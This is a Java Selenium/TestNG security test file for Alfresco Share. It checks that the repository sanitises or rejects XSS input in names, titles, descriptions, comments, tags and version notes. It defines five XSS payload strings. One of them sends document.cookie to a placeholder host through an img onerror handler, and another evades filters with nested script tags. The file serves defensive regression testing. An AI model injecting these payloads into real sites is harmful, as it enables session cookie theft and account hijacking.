/*
 * Copyright (C) 2005-2014 Alfresco Software Limited.
 *
 * This file is part of Alfresco
 *
 * Alfresco is free software: you can redistribute it and/or modify
 * it under the terms of the GNU Lesser General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * Alfresco is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU Lesser General Public License for more details.
 *
 * You should have received a copy of the GNU Lesser General Public License
 * along with Alfresco. If not, see <http://www.gnu.org/licenses/>.
 */
package org.alfresco.share.repository;

import static org.testng.Assert.assertEquals;
import static org.testng.Assert.assertNull;
import static org.testng.Assert.assertTrue;

import java.io.File;
import java.util.List;
import java.util.Map;

import org.alfresco.po.share.RepositoryPage;
import org.alfresco.po.share.SharePopup;
import org.alfresco.po.share.enums.Encoder;
import org.alfresco.po.share.site.NewFolderPage;
import org.alfresco.po.share.site.document.ContentDetails;
import org.alfresco.po.share.site.document.ContentType;
import org.alfresco.po.share.site.document.CreatePlainTextContentPage;
import org.alfresco.po.share.site.document.DetailsPage;
import org.alfresco.po.share.site.document.DocumentDetailsPage;
import org.alfresco.po.share.site.document.EditDocumentPropertiesPage;
import org.alfresco.po.share.site.document.EditDocumentPropertiesPage.Fields;
import org.alfresco.po.share.site.document.EditTextDocumentPage;
import org.alfresco.po.share.site.document.FileDirectoryInfo;
import org.alfresco.po.share.site.document.InlineEditPage;
import org.alfresco.po.share.site.document.MimeType;
import org.alfresco.po.share.site.document.SortField;
import org.alfresco.po.share.site.document.TagPage;
import org.alfresco.po.share.workflow.AssignmentPage;
import org.alfresco.po.share.workflow.StartWorkFlowPage;
import org.alfresco.po.share.workflow.WorkFlow;
import org.alfresco.po.share.workflow.WorkFlowType;
import org.alfresco.share.util.AbstractUtils;
import org.alfresco.share.util.ShareUser;
import org.alfresco.share.util.ShareUserRepositoryPage;
import org.alfresco.webdrone.testng.listener.FailedTestListener;
import org.apache.commons.logging.Log;
import org.apache.commons.logging.LogFactory;
import org.testng.annotations.BeforeClass;
import org.testng.annotations.Listeners;
import org.testng.annotations.Test;

/**
 * Repository tests for XSS handling
 * 
 * @author Jamie Allison
 * 
 * @since 4.3
 */
@Listeners(FailedTestListener.class)
public class SecurityXssTest extends AbstractUtils
{
    private static Log logger = LogFactory.getLog(SecurityXssTest.class);

    private static final String XSS_STRING_1 = "<IMG \"\"\"><SCRIPT>alert(\"test\")</SCRIPT>\">";
    private static final String XSS_STRING_2 = "<img src=\"1\" onerror=\"window.open('http://somenastyurl?'+(document.cookie))\">";
    private static final String XSS_STRING_3 = "<DIV STYLE=\"width: expression(alert('XSS'));\">";
    private static final String XSS_STRING_4 = "<IMG STYLE=\"xss:expr/*XSS*/ession(alert('XSS'))\">";
    private static final String XSS_STRING_5 = "<img><scrip<script>t>alert('XSS');<</script>/script>";

    protected String testUser;
    protected String siteName = "";

    @Override
    @BeforeClass(alwaysRun = true)
    public void setup() throws Exception
    {
        super.setup();
        testName = this.getClass().getSimpleName();
        testUser = testName + "@" + DOMAIN_FREE;
        logger.info("Starting Tests: " + testName);
    }

    @Test(groups = { "DataPrepRepoSecurity", "EnterpriseOnly" })
    public void dataPrep_Enterprise40x_5361() throws Exception
    {
        String testName = getTestName();
        String folderName = getFolderName(testName);

        ShareUser.login(drone, ADMIN_USERNAME, ADMIN_PASSWORD);

        ShareUserRepositoryPage.openRepositorySimpleView(drone);

        ShareUserRepositoryPage.createFolderInRepository(drone, folderName, folderName);
    }

    @Test(groups = "EnterpriseOnly")
    public void Enterprise40x_5361() throws Exception
    {
        String testName = getTestName();
        String folderName = getFolderName(testName);
        String fileName = getFileName(testName) + System.currentTimeMillis();

        ShareUser.login(drone, ADMIN_USERNAME, ADMIN_PASSWORD);

        RepositoryPage repoPage = ShareUserRepositoryPage.openRepositorySimpleView(drone);

        ContentDetails contentDetails =  new ContentDetails();
        contentDetails.setName(XSS_STRING_1);
        contentDetails.setTitle(XSS_STRING_2);
        contentDetails.setDescription(XSS_STRING_3);
        contentDetails.setContent(XSS_STRING_4);

        CreatePlainTextContentPage contentPage = ShareUserRepositoryPage.createContentInFolderWithValidation(drone, contentDetails, ContentType.PLAINTEXT, folderName).render();

        Map<CreatePlainTextContentPage.Fields, String> messages = contentPage.getMessages();

        //TODO: TESTLINK: Update ALL tests to match actual function i.e. "Value contains illegal characters." error balloon.
        assertEquals(messages.get(CreatePlainTextContentPage.Fields.NAME), drone.getValue("message.value.contains.illegal.characters"));
        assertNull(messages.get(CreatePlainTextContentPage.Fields.TITLE));
        assertNull(messages.get(CreatePlainTextContentPage.Fields.DESCRIPTION));
        assertNull(messages.get(CreatePlainTextContentPage.Fields.CONTENT));

        contentPage.cancel();

        repoPage = ShareUserRepositoryPage.openRepository(drone);
        contentDetails.setName(fileName);

        repoPage = ShareUserRepositoryPage.createContentInFolderWithValidation(drone, contentDetails, ContentType.PLAINTEXT, folderName).render();

        EditDocumentPropertiesPage editDocPropsPage = repoPage.getFileDirectoryInfo(fileName).selectEditProperties().render();

        assertEquals(editDocPropsPage.getName(), contentDetails.getName());
        assertEquals(editDocPropsPage.getDescription(), contentDetails.getDescription());
        assertEquals(editDocPropsPage.getDocumentTitle(), contentDetails.getTitle());
    }

    @Test(groups = { "DataPrepRepoSecurity", "EnterpriseOnly" })
    public void dataPrep_Enterprise40x_5362() throws Exception
    {
        String testName = getTestName();
        String folderName = getFolderName(testName);

        ShareUser.login(drone, ADMIN_USERNAME, ADMIN_PASSWORD);

        ShareUserRepositoryPage.openRepositorySimpleView(drone);

        ShareUserRepositoryPage.createFolderInRepository(drone, folderName, folderName);
    }

    @Test(groups = "EnterpriseOnly")
    public void Enterprise40x_5362() throws Exception
    {
        String testName = getTestName();
        String folderName = getFolderName(testName);
        String fileName = getFileName(testName) + System.currentTimeMillis();

        ShareUser.login(drone, ADMIN_USERNAME, ADMIN_PASSWORD);

        RepositoryPage repoPage = ShareUserRepositoryPage.openRepositorySimpleView(drone);

        ContentDetails contentDetails =  new ContentDetails();
        contentDetails.setName(XSS_STRING_2);
        contentDetails.setTitle(XSS_STRING_3);
        contentDetails.setDescription(XSS_STRING_4);
        contentDetails.setContent(XSS_STRING_5);

        CreatePlainTextContentPage contentPage = ShareUserRepositoryPage.createContentInFolderWithValidation(drone, contentDetails, ContentType.HTML, folderName).render();

        Map<CreatePlainTextContentPage.Fields, String> messages = contentPage.getMessages();

        assertEquals(messages.get(CreatePlainTextContentPage.Fields.NAME), drone.getValue("message.value.contains.illegal.characters"));
        assertNull(messages.get(CreatePlainTextContentPage.Fields.TITLE));
        assertNull(messages.get(CreatePlainTextContentPage.Fields.DESCRIPTION));
        assertNull(messages.get(CreatePlainTextContentPage.Fields.CONTENT));

        contentPage.cancel();

        repoPage = ShareUserRepositoryPage.openRepository(drone);
        contentDetails.setName(fileName);

        repoPage = ShareUserRepositoryPage.createContentInFolderWithValidation(drone, contentDetails, ContentType.HTML, folderName).render();

        EditDocumentPropertiesPage editDocPropsPage = repoPage.getFileDirectoryInfo(fileName).selectEditProperties().render();

        assertEquals(editDocPropsPage.getName(), contentDetails.getName());
        assertEquals(editDocPropsPage.getDescription(), contentDetails.getDescription());
        assertEquals(editDocPropsPage.getDocumentTitle(), contentDetails.getTitle());
    }

    @Test(groups = { "DataPrepRepoSecurity", "EnterpriseOnly" })
    public void dataPrep_Enterprise40x_5363() throws Exception
    {
        String testName = getTestName();
        String folderName = getFolderName(testName);

        ShareUser.login(drone, ADMIN_USERNAME, ADMIN_PASSWORD);

        ShareUserRepositoryPage.openRepositorySimpleView(drone);

        ShareUserRepositoryPage.createFolderInRepository(drone, folderName, folderName);
    }

    @Test(groups = "EnterpriseOnly")
    public void Enterprise40x_5363() throws Exception
    {
        String testName = getTestName();
        String folderName = getFolderName(testName);
        String fileName = getFileName(testName) + System.currentTimeMillis();

        ShareUser.login(drone, ADMIN_USERNAME, ADMIN_PASSWORD);

        RepositoryPage repoPage = ShareUserRepositoryPage.openRepositorySimpleView(drone);

        ContentDetails contentDetails =  new ContentDetails();
        contentDetails.setName(XSS_STRING_3);
        contentDetails.setTitle(XSS_STRING_4);
        contentDetails.setDescription(XSS_STRING_5);
        contentDetails.setContent(XSS_STRING_1);

        CreatePlainTextContentPage contentPage = ShareUserRepositoryPage.createContentInFolderWithValidation(drone, contentDetails, ContentType.XML, folderName).render();

        Map<CreatePlainTextContentPage.Fields, String> messages = contentPage.getMessages();

        assertEquals(messages.get(CreatePlainTextContentPage.Fields.NAME), drone.getValue("message.value.contains.illegal.characters"));
        assertNull(messages.get(CreatePlainTextContentPage.Fields.TITLE));
        assertNull(messages.get(CreatePlainTextContentPage.Fields.DESCRIPTION));
        assertNull(messages.get(CreatePlainTextContentPage.Fields.CONTENT));

        contentPage.cancel();

        repoPage = ShareUserRepositoryPage.openRepository(drone);
        contentDetails.setName(fileName);

        repoPage = ShareUserRepositoryPage.createContentInFolderWithValidation(drone, contentDetails, ContentType.XML, folderName).render();

        EditDocumentPropertiesPage editDocPropsPage = repoPage.getFileDirectoryInfo(fileName).selectEditProperties().render();

        assertEquals(editDocPropsPage.getName(), contentDetails.getName());
        assertEquals(editDocPropsPage.getDescription(), contentDetails.getDescription());
        assertEquals(editDocPropsPage.getDocumentTitle(), contentDetails.getTitle());
    }

    @Test(groups = { "DataPrepRepoSecurity", "EnterpriseOnly" })
    public void dataPrep_Enterprise40x_5364() throws Exception
    {
        String testName = getTestName();
        String folderName = getFolderName(testName);

        ShareUser.login(drone, ADMIN_USERNAME, ADMIN_PASSWORD);

        ShareUserRepositoryPage.openRepositorySimpleView(drone);
        ShareUserRepositoryPage.createFolderInRepository(drone, folderName, folderName);
    }

    @Test(groups = "EnterpriseOnly")
    public void Enterprise40x_5364() throws Exception
    {
        String testName = getTestName();
        String folderName = getFolderName(testName);
        String subFolderName = getFolderName(testName) + System.currentTimeMillis();
        String title = XSS_STRING_5;
        String description = XSS_STRING_1;

        ShareUser.login(drone, ADMIN_USERNAME, ADMIN_PASSWORD);

        ShareUserRepositoryPage.openRepositorySimpleView(drone);
        ShareUserRepositoryPage.navigateToFolderInRepository(drone, REPO + SLASH + folderName);

        NewFolderPage newFolderPage = ShareUserRepositoryPage.createFolderInRepositoryWithValidation(drone, XSS_STRING_4, title, description).render();
        assertEquals(newFolderPage.getMessage(NewFolderPage.Fields.NAME), drone.getValue("message.value.contains.illegal.characters"));

        newFolderPage.selectCancel();

        RepositoryPage repoPage = ShareUserRepositoryPage.createFolderInRepositoryWithValidation(drone, subFolderName, title, description).render();

        EditDocumentPropertiesPage editDocPropsPage = repoPage.getFileDirectoryInfo(subFolderName).selectEditProperties().render();

        assertEquals(editDocPropsPage.getName(), subFolderName);
        assertEquals(editDocPropsPage.getDescription(), description);
        assertEquals(editDocPropsPage.getDocumentTitle(), title);
    }

    @Test(groups = { "DataPrepRepoSecurity", "EnterpriseOnly" })
    public void dataPrep_Enterprise40x_5365() throws Exception
    {
        String testName = getTestName();
        String folderName = getFolderName(testName);

        ShareUser.login(drone, ADMIN_USERNAME, ADMIN_PASSWORD);

        ShareUserRepositoryPage.openRepositorySimpleView(drone);
        ShareUserRepositoryPage.createFolderInRepository(drone, folderName, folderName);
    }

    @Test(groups = "EnterpriseOnly")
    public void Enterprise40x_5365() throws Exception
    {
        String testName = getTestName();
        String folderName = getFolderName(testName);
        String subFolderName = getFolderName(testName) + System.currentTimeMillis();

        ShareUser.login(drone, ADMIN_USERNAME, ADMIN_PASSWORD);

        ShareUserRepositoryPage.openRepositorySimpleView(drone);
        ShareUserRepositoryPage.navigateToFolderInRepository(drone, REPO + SLASH + folderName);

        ShareUserRepositoryPage.createFolderInRepository(drone, subFolderName, subFolderName, subFolderName);

        DetailsPage detailsPage = ShareUserRepositoryPage.getContentDetailsPage(drone, subFolderName);
        EditDocumentPropertiesPage editProps = detailsPage.selectEditProperties().render();
        editProps.setName(XSS_STRING_5);
        editProps.setDocumentTitle(XSS_STRING_1);
        editProps.setDescription(XSS_STRING_2);

        editProps = editProps.selectSaveWithValidation().render();

        editProps.setName(subFolderName);

        detailsPage = editProps.selectSaveWithValidation().render();
        editProps = detailsPage.selectEditProperties().render();

        assertEquals(editProps.getName(), subFolderName);
        assertEquals(editProps.getDocumentTitle(), XSS_STRING_1);
        assertEquals(editProps.getDescription(), XSS_STRING_2);
    }

    @Test(groups = { "DataPrepRepoSecurity", "EnterpriseOnly" })
    public void dataPrep_Enterprise40x_5366() throws Exception
    {
        String testName = getTestName();
        String folderName = getFolderName(testName);

        ShareUser.login(drone, ADMIN_USERNAME, ADMIN_PASSWORD);

        ShareUserRepositoryPage.openRepositorySimpleView(drone);
        ShareUserRepositoryPage.createFolderInRepository(drone, folderName, folderName);
    }

    @Test(groups = "EnterpriseOnly")
    public void Enterprise40x_5366() throws Exception
    {
        String testName = getTestName();
        String folderName = getFolderName(testName);
        String fileName = getFileName(testName) + System.currentTimeMillis();

        ShareUser.login(drone, ADMIN_USERNAME, ADMIN_PASSWORD);

        ShareUserRepositoryPage.openRepositorySimpleView(drone);

        String[] fileInfo = {fileName, REPO + SLASH + folderName};
        ShareUserRepositoryPage.uploadFileInFolderInRepository(drone, fileInfo);

        DetailsPage detailsPage = ShareUserRepositoryPage.getContentDetailsPage(drone, fileName);
        EditDocumentPropertiesPage editProps = detailsPage.selectEditProperties().render();
        editProps.setName(XSS_STRING_5);
        editProps.setDocumentTitle(XSS_STRING_4);
        editProps.setDescription(XSS_STRING_3);
        editProps.setAuthor(XSS_STRING_2);

        editProps = editProps.selectSaveWithValidation().render();
        Map<Fields, String> messages = editProps.getMessages();

        assertEquals(messages.get(EditDocumentPropertiesPage.Fields.NAME), drone.getValue("message.value.contains.illegal.characters"));
        assertNull(messages.get(EditDocumentPropertiesPage.Fields.TITLE));
        assertNull(messages.get(EditDocumentPropertiesPage.Fields.DESCRIPTION));
        assertNull(messages.get(EditDocumentPropertiesPage.Fields.AUTHOR));

        editProps.setName(fileName);

        detailsPage = editProps.selectSaveWithValidation().render();
        editProps = detailsPage.selectEditProperties().render();

        assertEquals(editProps.getName(), fileName);
        assertEquals(editProps.getDocumentTitle(), XSS_STRING_4);
        assertEquals(editProps.getDescription(), XSS_STRING_3);
        assertEquals(editProps.getAuthor(), XSS_STRING_2);
    }

    @Test(groups = { "DataPrepRepoSecurity", "EnterpriseOnly" })
    public void dataPrep_Enterprise40x_5367() throws Exception
    {
        String testName = getTestName();
        String folderName = getFolderName(testName);

        ShareUser.login(drone, ADMIN_USERNAME, ADMIN_PASSWORD);

        ShareUserRepositoryPage.openRepositorySimpleView(drone);
        ShareUserRepositoryPage.createFolderInRepository(drone, folderName, folderName);
    }

    @Test(groups = "EnterpriseOnly")
    public void Enterprise40x_5367() throws Exception
    {
        String testName = getTestName();
        String folderName = getFolderName(testName);
        String subFolderName = getFolderName(testName) + System.currentTimeMillis();

        ShareUser.login(drone, ADMIN_USERNAME, ADMIN_PASSWORD);

        ShareUserRepositoryPage.openRepositorySimpleView(drone);
        ShareUserRepositoryPage.navigateToFolderInRepository(drone, REPO + SLASH + folderName);

        ShareUserRepositoryPage.createFolderInRepository(drone, subFolderName, subFolderName, subFolderName);

        DetailsPage detailsPage = ShareUserRepositoryPage.getContentDetailsPage(drone, subFolderName);

        detailsPage = detailsPage.addComment(XSS_STRING_1, Encoder.ENCODER_HTML).render();
        detailsPage = detailsPage.addComment(XSS_STRING_2, Encoder.ENCODER_HTML).render();
        detailsPage = detailsPage.addComment(XSS_STRING_3, Encoder.ENCODER_HTML).render();
        detailsPage = detailsPage.addComment(XSS_STRING_4, Encoder.ENCODER_HTML).render();
        detailsPage = detailsPage.addComment(XSS_STRING_5, Encoder.ENCODER_HTML).render();

        List<String> comments = detailsPage.getComments();
        assertTrue(comments.contains(XSS_STRING_1), "Comment missing: " + XSS_STRING_1);
        assertTrue(comments.contains(XSS_STRING_2), "Comment missing: " + XSS_STRING_2);
        assertTrue(comments.contains(XSS_STRING_3), "Comment missing: " + XSS_STRING_3);
        assertTrue(comments.contains(XSS_STRING_4), "Comment missing: " + XSS_STRING_4);
        assertTrue(comments.contains(XSS_STRING_5), "Comment missing: " + XSS_STRING_5);
    }

    @Test(groups = { "DataPrepRepoSecurity", "EnterpriseOnly" })
    public void dataPrep_Enterprise40x_5368() throws Exception
    {
        String testName = getTestName();
        String folderName = getFolderName(testName);

        ShareUser.login(drone, ADMIN_USERNAME, ADMIN_PASSWORD);

        ShareUserRepositoryPage.openRepositorySimpleView(drone);
        ShareUserRepositoryPage.createFolderInRepository(drone, folderName, folderName);
    }

    @Test(groups = "EnterpriseOnly")
    public void Enterprise40x_5368() throws Exception
    {
        String testName = getTestName();
        String folderName = getFolderName(testName);
        String fileName = getFolderName(testName) + System.currentTimeMillis();

        ShareUser.login(drone, ADMIN_USERNAME, ADMIN_PASSWORD);

        ShareUserRepositoryPage.openRepositorySimpleView(drone);

        ContentDetails contentDetails =  new ContentDetails();
        contentDetails.setName(fileName);
        contentDetails.setTitle(fileName);
        contentDetails.setDescription(fileName);
        contentDetails.setContent(fileName);

        ShareUserRepositoryPage.createContentInFolder(drone, contentDetails, ContentType.PLAINTEXT, folderName);

        DetailsPage detailsPage = ShareUserRepositoryPage.getContentDetailsPage(drone, fileName);

        detailsPage = detailsPage.addComment(XSS_STRING_1, Encoder.ENCODER_HTML).render();
        detailsPage = detailsPage.addComment(XSS_STRING_2, Encoder.ENCODER_HTML).render();
        detailsPage = detailsPage.addComment(XSS_STRING_3, Encoder.ENCODER_HTML).render();
        detailsPage = detailsPage.addComment(XSS_STRING_4, Encoder.ENCODER_HTML).render();
        detailsPage = detailsPage.addComment(XSS_STRING_5, Encoder.ENCODER_HTML).render();

        List<String> comments = detailsPage.getComments();
        assertTrue(comments.contains(XSS_STRING_1), "Comment missing: " + XSS_STRING_1);
        assertTrue(comments.contains(XSS_STRING_2), "Comment missing: " + XSS_STRING_2);
        assertTrue(comments.contains(XSS_STRING_3), "Comment missing: " + XSS_STRING_3);
        assertTrue(comments.contains(XSS_STRING_4), "Comment missing: " + XSS_STRING_4);
        assertTrue(comments.contains(XSS_STRING_5), "Comment missing: " + XSS_STRING_5);
    }

    @Test(groups = { "DataPrepRepoSecurity", "EnterpriseOnly" })
    public void dataPrep_Enterprise40x_5369() throws Exception
    {
        String testName = getTestName();
        String folderName = getFolderName(testName);

        ShareUser.login(drone, ADMIN_USERNAME, ADMIN_PASSWORD);

        ShareUserRepositoryPage.openRepositorySimpleView(drone);
        ShareUserRepositoryPage.createFolderInRepository(drone, folderName, folderName);
    }

    @Test(groups = "EnterpriseOnly")
    public void Enterprise40x_5369() throws Exception
    {
        String testName = getTestName();
        String folderName = getFolderName(testName);
        String fileName = getFileName(testName) + System.currentTimeMillis();

        ShareUser.login(drone, ADMIN_USERNAME, ADMIN_PASSWORD);

        ShareUserRepositoryPage.openRepositorySimpleView(drone);

        ContentDetails contentDetails =  new ContentDetails();
        contentDetails.setName(fileName);
        contentDetails.setTitle(fileName);
        contentDetails.setDescription(fileName);
        contentDetails.setContent(fileName);

        ShareUserRepositoryPage.createContentInFolder(drone, contentDetails, ContentType.PLAINTEXT, folderName);

        contentDetails.setName(XSS_STRING_4);
        contentDetails.setTitle(XSS_STRING_3);
        contentDetails.setDescription(XSS_STRING_2);
        contentDetails.setContent(XSS_STRING_1);

        InlineEditPage inlineEditPage = ShareUserRepositoryPage.editTextDocumentInLine(drone, fileName, contentDetails).render();
        EditTextDocumentPage editTextDocumentPage = (EditTextDocumentPage)inlineEditPage.getInlineEditDocumentPage(MimeType.TEXT).render();

        Map<CreatePlainTextContentPage.Fields, String> messages = editTextDocumentPage.getMessages();

        assertEquals(messages.get(CreatePlainTextContentPage.Fields.NAME), drone.getValue("message.value.contains.illegal.characters"));
        assertNull(messages.get(CreatePlainTextContentPage.Fields.TITLE));
        assertNull(messages.get(CreatePlainTextContentPage.Fields.DESCRIPTION));
        assertNull(messages.get(CreatePlainTextContentPage.Fields.CONTENT));

        editTextDocumentPage.cancel();
        contentDetails.setName(fileName);

        ShareUserRepositoryPage.editTextDocumentInLine(drone, fileName, contentDetails).render();

        ContentDetails details = ShareUserRepositoryPage.getInLineEditContentDetails(drone, fileName);

        assertEquals(details.getName(), contentDetails.getName());
        assertEquals(details.getDescription(), contentDetails.getDescription());
        assertEquals(details.getTitle(), contentDetails.getTitle());
        assertEquals(details.getContent(), contentDetails.getContent());
    }

    @Test(groups = { "DataPrepRepoSecurity", "EnterpriseOnly" })
    public void dataPrep_Enterprise40x_5370() throws Exception
    {
        String testName = getTestName();
        String folderName = getFolderName(testName);

        ShareUser.login(drone, ADMIN_USERNAME, ADMIN_PASSWORD);

        ShareUserRepositoryPage.openRepositorySimpleView(drone);
        ShareUserRepositoryPage.createFolderInRepository(drone, folderName, folderName);
    }

    @Test(groups = "EnterpriseOnly")
    public void Enterprise40x_5370() throws Exception
    {
        String testName = getTestName();
        String folderName = getFolderName(testName);
        String fileName = getFileName(testName) + System.currentTimeMillis();

        ShareUser.login(drone, ADMIN_USERNAME, ADMIN_PASSWORD);

        RepositoryPage repoPage = ShareUserRepositoryPage.openRepositorySimpleView(drone);

        String[] fileInfo = {fileName, REPO + SLASH + folderName};
        ShareUserRepositoryPage.uploadFileInFolderInRepository(drone, fileInfo);

        //ensure the new file is visible on the screen
        repoPage.getNavigation().selectSortFieldFromDropDown(SortField.CREATED);
        repoPage.getNavigation().sortAscending(false);

        FileDirectoryInfo fileDirInfo = repoPage.getFileDirectoryInfo(fileName);
        StartWorkFlowPage stWorkFlow = fileDirInfo.selectStartWorkFlow();

        WorkFlow workFlow = stWorkFlow.getWorkflowPage(WorkFlowType.NEW_WORKFLOW).render(maxWaitTime);

        AssignmentPage assignPage = workFlow.selectReviewer();

        assignPage.searchForUser(XSS_STRING_1);

        String content = assignPage.getContent();

        assertEquals(content, "No items found");

        assertTrue(assignPage.isUserFound(ADMIN_USERNAME));
    }

    @Test(groups = { "DataPrepRepoSecurity", "EnterpriseOnly" })
    public void dataPrep_Enterprise40x_5371() throws Exception
    {
        String testName = getTestName();
        String folderName = getFolderName(testName);

        ShareUser.login(drone, ADMIN_USERNAME, ADMIN_PASSWORD);

        ShareUserRepositoryPage.openRepositorySimpleView(drone);
        ShareUserRepositoryPage.createFolderInRepository(drone, folderName, folderName);
    }

    @Test(groups = "EnterpriseOnly")
    public void Enterprise40x_5371() throws Exception
    {
        String testName = getTestName();
        String folderName = getFolderName(testName);
        String fileName = getFileName(testName) + System.currentTimeMillis();
        String content = "New File";

        File file1 = newFile(fileName, content);

        ShareUser.login(drone, ADMIN_USERNAME, ADMIN_PASSWORD);

        ShareUserRepositoryPage.openRepositorySimpleView(drone);
        ShareUserRepositoryPage.navigateToFolderInRepository(drone, REPO + SLASH + folderName);

        ShareUserRepositoryPage.uploadFileInRepository(drone, file1);

        DocumentDetailsPage detailsPage = ShareUserRepositoryPage.getContentDetailsPage(drone, fileName).render();

        detailsPage = ShareUserRepositoryPage.uploadNewVersionFromDocDetail(drone, true, fileName, XSS_STRING_1);
        assertEquals(detailsPage.getCommentsOfLastCommit(), XSS_STRING_1);

        detailsPage = ShareUserRepositoryPage.uploadNewVersionFromDocDetail(drone, true, fileName, XSS_STRING_2);
        assertEquals(detailsPage.getCommentsOfLastCommit(), XSS_STRING_2);

        detailsPage = ShareUserRepositoryPage.uploadNewVersionFromDocDetail(drone, true, fileName, XSS_STRING_3);
        assertEquals(detailsPage.getCommentsOfLastCommit(), XSS_STRING_3);

        detailsPage = ShareUserRepositoryPage.uploadNewVersionFromDocDetail(drone, true, fileName, XSS_STRING_4);
        assertEquals(detailsPage.getCommentsOfLastCommit(), XSS_STRING_4);

        detailsPage = ShareUserRepositoryPage.uploadNewVersionFromDocDetail(drone, true, fileName, XSS_STRING_5);
        assertEquals(detailsPage.getCommentsOfLastCommit(), XSS_STRING_5);
    }

    @Test(groups = { "DataPrepRepoSecurity", "EnterpriseOnly" })
    public void dataPrep_Enterprise40x_5372() throws Exception
    {
        String testName = getTestName();
        String folderName = getFolderName(testName);

        ShareUser.login(drone, ADMIN_USERNAME, ADMIN_PASSWORD);

        ShareUserRepositoryPage.openRepositorySimpleView(drone);
        ShareUserRepositoryPage.createFolderInRepository(drone, folderName, folderName);
    }

    @Test(groups = "EnterpriseOnly")
    public void Enterprise40x_5372() throws Exception
    {
        String testName = getTestName();
        String folderName = getFolderName(testName);
        String subFolderName = getFolderName(testName) + System.currentTimeMillis();

        ShareUser.login(drone, ADMIN_USERNAME, ADMIN_PASSWORD);

        ShareUserRepositoryPage.openRepositorySimpleView(drone);
        ShareUserRepositoryPage.navigateToFolderInRepository(drone, REPO + SLASH + folderName);

        ShareUserRepositoryPage.createFolderInRepository(drone, subFolderName, subFolderName);

        DetailsPage detailsPage = ShareUserRepositoryPage.getContentDetailsPage(drone, subFolderName);
        EditDocumentPropertiesPage editProps = detailsPage.selectEditProperties().render();
        TagPage tagPage = editProps.getTag().render();

        SharePopup shareErrorPopup = tagPage.enterTagValue(XSS_STRING_4).render();

        assertEquals(shareErrorPopup.getShareMessage(), drone.getValue("message.could.not.create.new.item"));
    }

    @Test(groups = { "DataPrepRepoSecurity", "EnterpriseOnly" })
    public void dataPrep_Enterprise40x_5373() throws Exception
    {
        String testName = getTestName();
        String folderName = getFolderName(testName);

        ShareUser.login(drone, ADMIN_USERNAME, ADMIN_PASSWORD);

        ShareUserRepositoryPage.openRepositorySimpleView(drone);
        ShareUserRepositoryPage.createFolderInRepository(drone, folderName, folderName);
    }

    @Test(groups = "EnterpriseOnly")
    public void Enterprise40x_5373() throws Exception
    {
        String testName = getTestName();
        String folderName = getFolderName(testName);
        String fileName = getFileName(testName) + System.currentTimeMillis();
        String content = "New File";

        File file1 = newFile(fileName, content);

        ShareUser.login(drone, ADMIN_USERNAME, ADMIN_PASSWORD);

        ShareUserRepositoryPage.openRepositorySimpleView(drone);
        ShareUserRepositoryPage.navigateToFolderInRepository(drone, REPO + SLASH + folderName);

        ShareUserRepositoryPage.uploadFileInRepository(drone, file1);

        DetailsPage detailsPage = ShareUserRepositoryPage.getContentDetailsPage(drone, fileName);
        EditDocumentPropertiesPage editProps = detailsPage.selectEditProperties().render();
        TagPage tagPage = editProps.getTag().render();

        SharePopup shareErrorPopup = tagPage.enterTagValue(XSS_STRING_5).render();

        assertEquals(shareErrorPopup.getShareMessage(), drone.getValue("message.could.not.create.new.item"));
    }
}
